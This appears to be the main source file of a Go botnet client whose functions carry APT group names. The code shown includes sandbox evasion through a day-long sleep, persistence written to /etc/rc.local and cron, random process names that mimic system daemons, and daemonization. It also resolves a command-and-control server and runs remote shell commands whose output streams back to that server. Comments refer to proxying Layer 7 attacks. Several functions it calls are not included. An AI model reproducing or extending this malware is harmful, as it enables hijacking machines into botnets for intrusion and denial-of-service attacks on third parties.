package main

import (
	"bufio"
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ============================================================================
// LOGGING & DEBUG FUNCTIONS
// ============================================================================

// deoxys prints debug messages when debugMode is enabled.
// Useful for troubleshooting C2 connection issues during development.
// Parameters:
//   - format: Printf-style format string
//   - args: Format arguments
func deoxys(format string, args ...interface{}) {
	if debugMode {
		fmt.Printf("[DEBUG] "+format+"\n", args...)
	}
}

var (
	lazarusListener  net.Listener
	lazarusActive    bool
	lazarusMutex     sync.Mutex
	lazarusCount     int32
	aptStopChan            = make(chan struct{})
	aptStopMutex     sync.Mutex
	aptAttackRunning bool

	// Proxy support for L7 attacks (pre-validated by CNC)
	proxyList      []string
	proxyListMutex sync.RWMutex

	// Pre-cached bot metadata (computed once in main before connecting)
	cachedBotID  string
	cachedArch   string
	cachedRAM    int64
	cachedCPU    int
	cachedProc   string
	cachedUplink float64
)

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

// sandworm appends a line to a file, creating it if it doesn't exist.
// Used for adding persistence entries to system files like /etc/rc.local.
// Parameters:
//   - path: File path to append to
//   - line: Content to append
//   - perm: File permissions if creating new file
//
// Returns: error if file operation fails
func sandworm(path, line string, perm os.FileMode) error {
	if debugMode {
		deoxys("sandworm: [DEBUG] Would open file %s for append", path)
		deoxys("sandworm: [DEBUG] Would write: %s", strings.TrimSpace(line))
		deoxys("sandworm: [DEBUG] Skipping actual write (debug mode)")
		return nil
	}

	// Production mode - execute silently
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(line)
	return err
}

// turla generates a random alphanumeric string of specified length.
// Used for generating random filenames, process names, and request data.
// Parameters:
//   - n: Length of random string to generate
//
// Returns: Random string containing a-z and 0-9 characters
func turla(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// kimsuky generates a random process name that looks like a legitimate system process.
// Combines common daemon names with random suffix to avoid detection.
// Returns: String like "syncd-a7x2" or "crond-9k1m"
func kimsuky() string {
	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
	return dict[rand.Intn(len(dict))] + "-" + turla(4)
}

// ============================================================================
// SHELL EXECUTION FUNCTIONS
// ============================================================================

// sidewinder executes a shell command and captures output synchronously.
// Runs command via "sh -c" and captures both stdout and stderr.
// Parameters:
//   - cmd: Shell command string to execute
//
// Returns: Combined stdout/stderr output, and error if command failed
func sidewinder(cmd string) (string, error) {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
	}
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nStderr: " + stderr.String()
	}
	return output, nil
}

// oceanLotus executes a shell command in detached/background mode.
// Uses Setsid to create new session, disconnecting from parent.
// Useful for long-running commands that shouldn't block C2 communication.
// Parameters:
//   - cmd: Shell command string to execute in background
func oceanLotus(cmd string) {
	go func() {
		args := []string{"sh", "-c", cmd}
		command := exec.Command(args[0], args[1:]...)
		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		command.Stdout = nil
		command.Stderr = nil
		command.Stdin = nil
		command.Start()
	}()
}

// machete executes a shell command with real-time output streaming to C2.
// Output is sent line-by-line as it becomes available, prefixed with STDOUT/STDERR.
// Useful for long-running commands where immediate feedback is needed.
// Parameters:
//   - cmd: Shell command string to execute
//   - conn: C2 connection to stream output to
//
// Returns: error if command setup fails
func machete(cmd string, conn net.Conn) error {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	stdout, err := command.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		return err
	}
	if err := command.Start(); err != nil {
		return err
	}
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
		}
	}()
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
		}
	}()
	err = command.Wait()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
	} else {
		conn.Write([]byte("EXIT: Command completed successfully\n"))
	}
	return nil
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

// main is the bot's entry point that orchestrates startup and C2 connection.
// Startup sequence:
//  1. Check for sandbox/analysis environment (winnti)
//  2. Setup basic persistence (fin7)
//  3. Resolve C2 address via multi-method DNS (dialga)
//  4. Enter reconnection loop with TLS connections
//
// The bot will continuously attempt to reconnect on disconnection.
func main() {
	// Decrypt all sensitive strings before anything else touches them.
	initSensitiveStrings()

	// Daemonize first — forks, detaches, redirects fds, ignores signals.
	// Parent exits here; only the daemon child continues past this point.
	stuxnet()

	deoxys("main: Bot starting up...")
	deoxys("main: Protocol version: %s", protocolVersion)
	revilSingleInstance()
	if winnti() {
		deoxys("main: Sandbox detected, entering benign sleep")
		// Sleep 24-27h — outlasts sandbox analysis windows without
		// producing a suspicious immediate exit.
		jitter := time.Duration(24*3600+rand.Intn(3*3600)) * time.Second
		time.Sleep(jitter)
		os.Exit(0)
	}
	deoxys("main: No sandbox detected, continuing")
	deoxys("main: Running persistence check (fin7 -> rc.local)...")
	fin7()
	deoxys("main: fin7 persistence check complete")
	deoxys("main: Running persistence check (lazarus -> cron)...")
	lazarus()
	deoxys("main: lazarus persistence check complete")
	// Pre-compute bot metadata BEFORE connecting so REGISTER is instant.
	cachedBotID = mustangPanda()
	cachedArch = charmingKitten()
	cachedRAM = revilMem()
	cachedCPU = revilCPU()
	cachedProc = revilProc()
	cachedUplink = revilUplinkCached()
	deoxys("main: Pre-cached metadata — ID:%s Arch:%s RAM:%dMB CPU:%d Proc:%s Uplink:%.2fMbps",
		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)

	deoxys("main: Resolving C2 address...")
	c2Address := dialga()
	if c2Address == "" {
		deoxys("main: Failed to resolve C2, exiting")
		return
	}
	deoxys("main: C2 resolved to: %s", c2Address)
	host, port, err := scarcruft(c2Address)
	if err != nil {
		deoxys("main: Failed to parse C2 address: %v", err)
		return
	}
	deoxys("main: C2 Host: %s, Port: %s", host, port)
	deoxys("main: Entering main connection loop...")
	for {
		deoxys("main: Attempting connection to C2...")
		conn, err := gamaredon(host, port)
		if err != nil {
			deoxys("main: Connection failed: %v, retrying in %v", err, fancyBear)
			time.Sleep(fancyBear)
			continue
		}
		deoxys("main: Connected to C2, starting handler")
		anonymousSudan(conn)
		deoxys("main: Handler returned, reconnecting in %v", fancyBear)
		time.Sleep(fancyBear)
	}
}
